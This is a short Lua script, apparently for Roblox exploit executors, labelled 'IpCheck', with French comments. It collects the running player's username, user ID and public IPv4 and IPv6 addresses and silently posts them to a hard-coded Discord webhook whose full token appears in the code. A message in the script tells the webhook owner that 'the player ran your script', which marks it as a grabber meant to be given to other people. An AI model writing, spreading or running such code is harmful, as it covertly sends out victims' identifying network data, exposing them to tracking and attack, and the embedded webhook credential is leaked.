--IpCheck
local webhookUrl = "https://discord.com/api/webhooks/1090334868635910245/iFTdBxsR2ued4LFm1gLpBRwzH_5W3GGvTAkb7FHS728p6039_pSqIkmNxlM4AWmrPz5t" -- Remplacer par l'URL de votre webhook Discord

local IPv4 = game:HttpGet("https://v4.ident.me/")
local IPv6 = game:HttpGet("https://v6.ident.me/")

local playerName = game.Players.LocalPlayer.Name
local UserId = game.Players.LocalPlayer.UserId
local message = "Le joueur " .. playerName .." a exécuté votre script,so id est " .. UserId .. " + ipv4 " ..IPv4.. " et ipv6 " .. IPv6 .. ""
local data = {
  content = message
}
local encodedData = game:GetService("HttpService"):JSONEncode(data)
local headers = {
  ["Content-Type"] = "application/json"
}
local httpRequest = http_request or request or HttpPost or syn.request -- Vérification de la disponibilité de la fonction HttpPost ou syn.request
local requestInfo = {
  Url = webhookUrl,
  Method = "POST",
  Headers = headers,
  Body = encodedData
}
httpRequest(requestInfo)


